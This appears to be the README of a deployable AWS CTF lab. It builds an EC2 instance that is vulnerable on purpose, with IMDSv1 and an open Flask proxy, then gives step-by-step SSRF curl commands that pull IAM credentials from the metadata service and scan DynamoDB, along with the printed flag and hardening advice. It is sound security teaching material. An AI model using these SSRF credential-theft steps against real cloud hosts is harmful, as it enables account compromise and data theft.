# CTF Challenge: IMDS Metadata Vulnerability

## Overview

This is a Capture The Flag (CTF) challenge demonstrating an **IMDS (Instance Metadata Service) vulnerability** in AWS EC2. The challenge showcases how IMDSv1 can be exploited through Server-Side Request Forgery (SSRF) to steal IAM credentials and access sensitive data.

## Architecture

The infrastructure consists of:

- **EC2 Instance** (t2.micro) running a vulnerable Flask proxy application
- **DynamoDB Table** (GameData) containing the flag
- **IAM Role** with DynamoDB read permissions attached to the EC2 instance
- **Security Group** allowing HTTP (80) and SSH (22) from anywhere

**Vulnerability**: The EC2 instance has IMDSv1 enabled (`http_tokens = "optional"`), allowing unauthenticated access to the metadata service at `http://169.254.169.254`.

View the architecture diagram in the Canvas tab or at `.infracodebase/ctf-architecture.json`.

## Prerequisites

- Terraform (or OpenTofu) installed
- AWS CLI configured with credentials
- AWS account with permissions to create EC2, DynamoDB, IAM resources
- Environment variables set:
  - `AWS_ACCESS_KEY_ID`
  - `AWS_SECRET_ACCESS_KEY`
  - `AWS_DEFAULT_REGION`

## Deployment

### 1. Initialize Terraform

```bash
terraform init
```

### 2. Review the Plan

```bash
terraform plan
```

### 3. Deploy the Infrastructure

```bash
terraform apply
```

Type `yes` when prompted. Note the output `public_ip` - you'll need this to access the vulnerable application.

### 4. Wait for Instance Initialization

The EC2 instance needs 2-3 minutes to:
- Install Python 3 and Flask
- Start the proxy application on port 80

Check if the app is ready:

```bash
curl http://<public_ip>/proxy?url=http://example.com
```

If you see HTML content, the app is running.

## Testing the Challenge

### Step 1: Verify the Proxy Works

Test that the proxy endpoint is functional:

```bash
curl "http://<public_ip>/proxy?url=http://example.com"
```

You should receive the HTML content from example.com.

### Step 2: Exploit IMDSv1 to Get IAM Credentials

Query the metadata service to find the IAM role name:

```bash
curl "http://<public_ip>/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Response should be: `EC2-Web-Role`

Now retrieve the IAM credentials:

```bash
curl "http://<public_ip>/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Web-Role"
```

This returns temporary AWS credentials:
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
```

### Step 3: Use Stolen Credentials to Access DynamoDB

Export the stolen credentials:

```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
export AWS_SESSION_TOKEN="<Token>"
export AWS_DEFAULT_REGION="us-east-1"
```

Scan the DynamoDB table to retrieve the flag:

```bash
aws dynamodb scan --table-name GameData
```

The response contains the flag:

```json
{
  "Items": [
    {
      "ConfigID": {
        "S": "SecretFlag"
      },
      "FlagValue": {
        "S": "CTF{M3tadat4_1s_Vulnerabl3_2026}"
      }
    }
  ]
}
```

**FLAG**: `CTF{M3tadat4_1s_Vulnerabl3_2026}`

### Step 4: Alternative - Retrieve Specific Item

If you know the key:

```bash
aws dynamodb get-item \
  --table-name GameData \
  --key '{"ConfigID": {"S": "SecretFlag"}}'
```

## Cleanup

To destroy all resources and avoid AWS charges:

```bash
terraform destroy
```

Type `yes` when prompted.

## Understanding the Vulnerability

### What is IMDS?

The **Instance Metadata Service (IMDS)** is an AWS service available at `http://169.254.169.254` from any EC2 instance. It provides:
- Instance configuration data
- IAM role credentials
- User data scripts
- Network configuration

### IMDSv1 vs IMDSv2

- **IMDSv1** (vulnerable): Simple HTTP GET requests, no authentication required
- **IMDSv2** (secure): Requires a session token obtained via PUT request with TTL header

### The Attack Chain

1. **SSRF via Proxy**: The Flask app accepts any URL without validation
2. **IMDS Access**: Attacker uses proxy to query `http://169.254.169.254`
3. **Credential Theft**: Retrieves temporary IAM credentials from metadata
4. **Privilege Escalation**: Uses stolen credentials to access DynamoDB
5. **Data Exfiltration**: Reads sensitive data (the flag) from the database

## Security Best Practices & Recommendations

### 1. Enable IMDSv2 (Session-Based Authentication)

**ALWAYS** require IMDSv2 on production instances:

```hcl
metadata_options {
  http_endpoint               = "enabled"
  http_tokens                 = "required"  # Enforce IMDSv2
  http_put_response_hop_limit = 1
}
```

IMDSv2 requires a session token, preventing SSRF attacks from accessing metadata.

### 2. Validate and Sanitize User Input

**Never trust user-supplied URLs**. Implement strict validation:

```python
# Example validation
BLOCKED_HOSTS = [
    '169.254.169.254',  # IMDS
    'metadata.google.internal',  # GCP metadata
    '127.0.0.1',  # Localhost
    'localhost',
]

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.hostname in BLOCKED_HOSTS:
        return False
    if parsed.hostname.startswith('10.') or parsed.hostname.startswith('172.') or parsed.hostname.startswith('192.168.'):
        return False  # Block private IPs
    return True
```

### 3. Apply Least Privilege IAM Permissions

The IAM role grants `dynamodb:Scan` which allows reading ALL items. Restrict to minimum required:

```hcl
policy = jsonencode({
  Version = "2012-10-17"
  Statement = [{
    Effect   = "Allow"
    Action   = ["dynamodb:GetItem"]  # Only specific item access
    Resource = aws_dynamodb_table.flag_table.arn
    Condition = {
      StringEquals = {
        "dynamodb:LeadingKeys" = ["AllowedConfigID"]  # Restrict keys
      }
    }
  }]
})
```

### 4. Restrict Security Group Rules

The current security group allows SSH and HTTP from `0.0.0.0/0` (anywhere). Limit to specific IPs:

```hcl
ingress {
  from_port   = 22
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["YOUR_OFFICE_IP/32"]  # Restrict SSH to known IPs
}
```

### 5. Use VPC Endpoints for AWS Services

Deploy a VPC endpoint for DynamoDB to keep traffic within AWS network:

```hcl
resource "aws_vpc_endpoint" "dynamodb" {
  vpc_id          = aws_vpc.main.id
  service_name    = "com.amazonaws.us-east-1.dynamodb"
  route_table_ids = [aws_route_table.private.id]
}
```

### 6. Enable Logging and Monitoring

- **CloudTrail**: Log all API calls to detect credential abuse
- **VPC Flow Logs**: Monitor network traffic patterns
- **GuardDuty**: Detect unusual IAM credential usage
- **CloudWatch Alarms**: Alert on DynamoDB scan operations

### 7. Implement Network Egress Filtering

Use network ACLs or firewall rules to block outbound traffic to metadata service from application layer.

### 8. Additional Hardening

- Store sensitive data encrypted at rest (enable DynamoDB encryption)
- Use AWS Secrets Manager for secrets, not DynamoDB
- Implement Web Application Firewall (WAF) rules
- Run vulnerability scanning tools (e.g., Prowler, ScoutSuite)
- Use AWS Systems Manager Session Manager instead of SSH
- Enable MFA for AWS console access
- Implement automated security scanning in CI/CD pipelines

## Learning Resources

- [AWS IMDS Security Best Practices](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Capital One Breach Case Study](https://www.capitalone.com/digital/facts2019/) - Real-world IMDS exploitation

## License

This project is for educational purposes only. Do not deploy vulnerable infrastructure in production environments.

## Author

CTF Challenge demonstrating AWS IMDS vulnerability and SSRF exploitation techniques.